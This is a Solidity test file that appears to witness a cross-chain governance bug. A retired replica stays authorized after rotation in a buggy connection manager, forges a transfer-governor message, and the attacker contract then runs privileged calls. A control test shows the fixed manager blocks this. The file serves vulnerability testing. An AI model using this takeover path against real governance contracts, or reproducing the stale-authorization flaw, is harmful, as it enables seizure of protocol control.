// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import {
    GovernanceMessageLite,
    GovernancePrivilegedCallerHarness,
    GovernanceReplicaCallerHarness,
    GovernanceRouterTakeoverTarget
} from "../src/GovernanceRouterTakeoverHarness.sol";
import {
    XAppConnectionManagerBug,
    XAppConnectionManagerFixed
} from "../src/XAppConnectionManagerHarness.sol";

contract GovernanceTakeoverViaStaleReplicaTest {
    uint32 internal constant ENROLL_DOMAIN = 1;
    uint32 internal constant LOCAL_DOMAIN = 1000;
    uint32 internal constant GOVERNOR_DOMAIN = 2000;
    bytes32 internal constant GOVERNOR_ROUTER = bytes32(uint256(0xBEEF));

    function _assertTrue(bool _condition, string memory _message) internal pure {
        require(_condition, _message);
    }

    function _pickAttacker(
        uint8 _id,
        GovernancePrivilegedCallerHarness _a,
        GovernancePrivilegedCallerHarness _b
    ) internal pure returns (GovernancePrivilegedCallerHarness) {
        return _id % 2 == 0 ? _a : _b;
    }

    /// @notice End-to-end witness:
    /// 1) enroll R1 then rotate to R2 in buggy manager
    /// 2) stale R1 remains `isReplica == true`
    /// 3) stale R1 sends forged transfer-governor message
    /// 4) forged governor can execute privileged local actions
    function test_stale_replica_can_take_governor_in_buggy_manager() public {
        XAppConnectionManagerBug bug = new XAppConnectionManagerBug();
        GovernanceRouterTakeoverTarget gov = new GovernanceRouterTakeoverTarget(
            address(bug),
            LOCAL_DOMAIN,
            GOVERNOR_DOMAIN,
            GOVERNOR_ROUTER
        );

        GovernanceReplicaCallerHarness r1 = new GovernanceReplicaCallerHarness();
        GovernanceReplicaCallerHarness r2 = new GovernanceReplicaCallerHarness();
        GovernancePrivilegedCallerHarness attacker = new GovernancePrivilegedCallerHarness();

        bug.ownerEnrollReplica(address(r1), ENROLL_DOMAIN);
        bug.ownerEnrollReplica(address(r2), ENROLL_DOMAIN);

        _assertTrue(
            bug.isReplica(address(r1)),
            "expected stale replica auth in buggy manager"
        );

        bytes memory forged = GovernanceMessageLite.formatTransferGovernor(
            LOCAL_DOMAIN,
            bytes32(uint256(uint160(address(attacker))))
        );

        (bool okHandle, ) = r1.callHandle(
            address(gov),
            GOVERNOR_DOMAIN,
            0,
            GOVERNOR_ROUTER,
            forged
        );
        _assertTrue(okHandle, "retired replica failed to inject transfer-governor");
        _assertTrue(
            gov.governor() == address(attacker),
            "forged transfer-governor did not seize governor role"
        );

        (bool okPrivileged, ) = attacker.callSetPrivilegedTarget(
            address(gov),
            address(0xCAFE)
        );
        _assertTrue(okPrivileged, "new forged governor could not run privileged action");
        _assertTrue(
            gov.privilegedTarget() == address(0xCAFE),
            "privileged target was not updated"
        );
    }

    /// @notice Fuzz witness: stale replica can always force local governor transfer in buggy manager.
    function testFuzz_buggy_manager_stale_replica_can_take_governor(
        uint8 attackerId,
        address newPrivilegedTarget
    ) public {
        XAppConnectionManagerBug bug = new XAppConnectionManagerBug();
        GovernanceRouterTakeoverTarget gov = new GovernanceRouterTakeoverTarget(
            address(bug),
            LOCAL_DOMAIN,
            GOVERNOR_DOMAIN,
            GOVERNOR_ROUTER
        );

        GovernanceReplicaCallerHarness r1 = new GovernanceReplicaCallerHarness();
        GovernanceReplicaCallerHarness r2 = new GovernanceReplicaCallerHarness();
        GovernancePrivilegedCallerHarness attackerA = new GovernancePrivilegedCallerHarness();
        GovernancePrivilegedCallerHarness attackerB = new GovernancePrivilegedCallerHarness();
        GovernancePrivilegedCallerHarness attacker = _pickAttacker(
            attackerId,
            attackerA,
            attackerB
        );

        bug.ownerEnrollReplica(address(r1), ENROLL_DOMAIN);
        bug.ownerEnrollReplica(address(r2), ENROLL_DOMAIN);

        bytes memory forged = GovernanceMessageLite.formatTransferGovernor(
            LOCAL_DOMAIN,
            bytes32(uint256(uint160(address(attacker))))
        );
        (bool okHandle, ) = r1.callHandle(
            address(gov),
            GOVERNOR_DOMAIN,
            0,
            GOVERNOR_ROUTER,
            forged
        );
        _assertTrue(okHandle, "stale replica could not forge transfer-governor");
        _assertTrue(
            gov.governor() == address(attacker),
            "attacker did not become governor"
        );

        (bool okPrivileged, ) = attacker.callSetPrivilegedTarget(
            address(gov),
            newPrivilegedTarget
        );
        _assertTrue(okPrivileged, "forged governor could not execute privileged call");
        _assertTrue(
            gov.privilegedTarget() == newPrivilegedTarget,
            "privileged call did not mutate state"
        );
    }

    /// @notice Control: fixed enrollment logic revokes stale auth, blocking this takeover path.
    function test_fixed_manager_blocks_stale_governance_takeover() public {
        XAppConnectionManagerFixed fixedXcm = new XAppConnectionManagerFixed();
        GovernanceRouterTakeoverTarget gov = new GovernanceRouterTakeoverTarget(
            address(fixedXcm),
            LOCAL_DOMAIN,
            GOVERNOR_DOMAIN,
            GOVERNOR_ROUTER
        );

        GovernanceReplicaCallerHarness r1 = new GovernanceReplicaCallerHarness();
        GovernanceReplicaCallerHarness r2 = new GovernanceReplicaCallerHarness();
        GovernancePrivilegedCallerHarness attacker = new GovernancePrivilegedCallerHarness();

        fixedXcm.ownerEnrollReplica(address(r1), ENROLL_DOMAIN);
        fixedXcm.ownerEnrollReplica(address(r2), ENROLL_DOMAIN);

        _assertTrue(
            !fixedXcm.isReplica(address(r1)),
            "fixed manager should revoke stale replica auth"
        );

        bytes memory forged = GovernanceMessageLite.formatTransferGovernor(
            LOCAL_DOMAIN,
            bytes32(uint256(uint160(address(attacker))))
        );
        (bool okHandle, ) = r1.callHandle(
            address(gov),
            GOVERNOR_DOMAIN,
            0,
            GOVERNOR_ROUTER,
            forged
        );
        _assertTrue(!okHandle, "stale replica unexpectedly passed onlyReplica");
        _assertTrue(gov.governor() == address(0), "governor unexpectedly changed");

        (bool okPrivileged, ) = attacker.callSetPrivilegedTarget(
            address(gov),
            address(0xCAFE)
        );
        _assertTrue(!okPrivileged, "non-governor unexpectedly executed privileged call");
    }
}

